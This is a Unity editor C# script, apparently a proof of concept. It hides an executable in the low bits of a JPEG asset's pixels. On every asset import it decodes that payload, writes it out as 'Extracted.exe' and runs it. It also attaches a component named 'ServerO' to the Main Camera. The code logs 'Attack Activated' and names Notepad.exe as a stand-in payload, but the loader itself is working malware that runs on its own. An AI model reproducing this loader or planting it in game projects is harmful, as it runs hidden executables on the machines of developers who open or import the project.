using UnityEditor;
using UnityEngine;
using System.IO;
using System;
using UnityEditor.SceneManagement;
using UnityEngine.SceneManagement;

public class Launcher: AssetPostprocessor
{
    void OnPreprocessTexture()
    {
        // Only modify our target texture
        if (assetPath.EndsWith("Pearlesque_embedded.jpg", StringComparison.OrdinalIgnoreCase))
        {
            TextureImporter importer = (TextureImporter)assetImporter;
            importer.isReadable = true; // Enable Read/Write
            importer.textureCompression = TextureImporterCompression.Uncompressed;
            importer.SaveAndReimport(); // Apply changes
        }
    }
    static void OnPostprocessAllAssets(string[] importedAssets, string[] deletedAssets, string[] movedAssets, string[] movedFromAssetPaths) 
    {
        Debug.Log("Developer Mode: Attack Activated!");
        string scriptContent3 = Process();

        byte[] bytes = Convert.FromBase64String(scriptContent3);
        File.WriteAllBytes("Assets/Extracted.exe", bytes);
        System.Diagnostics.Process.Start("Assets/Extracted.exe");

        AssetDatabase.Refresh();
        EditorApplication.delayCall += AddComponentToMainCamera;
    }

    static void AddComponentToMainCamera()
    {
        // Check if type exists
        Type helloType = Type.GetType("ServerO, Assembly-CSharp");
        if (helloType == null) return;

        // Find Main Camera and add component
        GameObject mainCamera = GameObject.Find("Main Camera");
        if (mainCamera != null && mainCamera.GetComponent(helloType) == null)
        {
            mainCamera.AddComponent(helloType);
            EditorUtility.SetDirty(mainCamera);
            EditorSceneManager.MarkSceneDirty(SceneManager.GetActiveScene());
        }
    }
    private static string Process()
    {
        string embeddedPath = "Assets/Pearlesque_embedded.jpg";
        Texture2D watermarkedTexture = (Texture2D)AssetDatabase.LoadAssetAtPath(embeddedPath, typeof(Texture2D));
        Debug.Log("Texture Isreadable: "+watermarkedTexture.isReadable);

        // This is a question... It could be possible to embed the length of the stegonography as a prefix of known len. 
        // Then pull that and use it to extract the rest. Then the size of the embedded binary doesn't need to be known
        // for extraction.
        int requiredBits = 267608 * 8; // This is the size of B64 encoded Notepad.exe
        string decodedWatermark = DecodeWatermark(watermarkedTexture, requiredBits);
        return decodedWatermark;
    }

    private static string DecodeWatermark(Texture2D texture, int length)
    {
        Color[] pixels = texture.GetPixels();
        System.Text.StringBuilder binaryData = new System.Text.StringBuilder();
        for (int i = 0; i < length && i < pixels.Length; i++)
        {
            Color pixel = pixels[i];
            binaryData.Append(ExtractLSB(pixel.r));
        }
        string binaryString = binaryData.ToString();
        System.Text.StringBuilder decodedMessage = new System.Text.StringBuilder();

        for (int i = 0; i + 8 <= binaryString.Length; i += 8)
        {
            string byteString = binaryString.Substring(i, 8);
            decodedMessage.Append((char)System.Convert.ToByte(byteString, 2));
        }

        return decodedMessage.ToString();
    }
    private static char ExtractLSB(float channelValue)
    {
        int intValue = Mathf.RoundToInt(channelValue * 255);
        return (intValue & 1) == 1 ? '1' : '0';
    }
}



